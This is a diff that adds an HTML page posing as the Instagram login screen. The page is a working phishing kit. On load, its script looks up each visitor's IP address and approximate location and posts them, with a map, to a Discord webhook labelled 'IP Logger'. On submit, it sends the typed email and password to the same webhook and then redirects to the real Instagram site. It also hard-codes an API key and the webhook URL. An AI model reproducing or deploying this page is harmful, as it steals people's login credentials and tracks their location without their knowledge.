@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google" content="notranslate"> <!-- Disable Google Translate -->
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="img.icon.png" href="./img/insta-fav.ico">
+
+    <title>Instagram</title>
+</head>
+
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form>
+                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <input name="email" placeholder="Phone number, username, or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" type="password" placeholder="Password" />
+
+                    <button type="submit">Log in</button>
+
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot Password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
+                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2024 Instagram by Facebook</p>
+    </footer>
+</body>
+<script>
+    function json(url) {
+        return fetch(url).then(res => res.json());
+    }
+
+    let apiKey = 'd4740360e99341f664d94d1437141a8bdfe3a155e3f23cb9ddea969e';
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+        console.log(data);  // Log the data to ensure it's correct
+
+        if (!data || !data.ip) {
+            console.log('No IP data received!');
+            return;
+        }
+
+        var msg = `
+  
+    Someone has opened the site!
+    Details found!
+    Possible ip - ${data.ip}
+    Possible city - ${data.city}
+    Possible country code - ${data.country_code}
+    Latitude - ${data.latitude}
+    Longitude - ${data.longitude}
+
+    <iframe src="${"https://www.google.com/maps?q=" + data.latitude + "," + data.longitude + "&output=embed"}" width="800" height="600" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+    `;
+
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1307319198573400115/qLTUKXnecJP3XvNO4WWtR3BG4YdpOnki5ogbXGlH4VOvmy0i8dvO47kmbPBQ6lEeUcV2");
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            username: "IP Logger",
+            avatar_url: "https://example.com/avatar.png", // Optional
+            content: msg
+        };
+        request.send(JSON.stringify(params));
+    }).catch(err => {
+        console.log('Error fetching IP data:', err);
+    });
+
+
+
+
+
+
+
+
+
+
+
+
+
+    document.querySelector('form').addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevent default form submission behavior
+
+        // Get the email and password from the form
+        const email = document.querySelector('input[name="email"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+
+        if (!email || !password) {
+            console.log("Please enter both email and password.");
+            return; // Stop if fields are empty
+        }
+
+        // Change cursor to loading
+        document.body.style.cursor = 'wait'; // Show loading cursor
+
+        // Optionally, you can show a loading spinner or an indicator
+        const loadingSpinner = document.createElement('div');
+        loadingSpinner.classList.add('loading-spinner');
+        document.body.appendChild(loadingSpinner); // Add spinner to the body
+
+        // Prepare the data to send to the webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1307319198573400115/qLTUKXnecJP3XvNO4WWtR3BG4YdpOnki5ogbXGlH4VOvmy0i8dvO47kmbPBQ6lEeUcV2';
+        const data = {
+            content: `Email: ${email}\nPassword: ${password}`
+        };
+
+        // Send the data to the Discord webhook
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Login information sent!');
+                    // Redirect to Instagram after successful submission
+                    window.location.href = 'https://www.instagram.com/';
+                } else {
+                    console.log('Failed to send login info. Please try again.');
+                    alert('Failed to send login info. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.log('Error sending login info: ' + error);
+                alert('Error sending login info. Please try again.');
+            })
+            .finally(() => {
+                // Remove the loading spinner and reset cursor after the request completes
+                loadingSpinner.remove();
+                document.body.style.cursor = 'default'; // Reset cursor
+            });
+    });
+
+</script>
+
+</html>
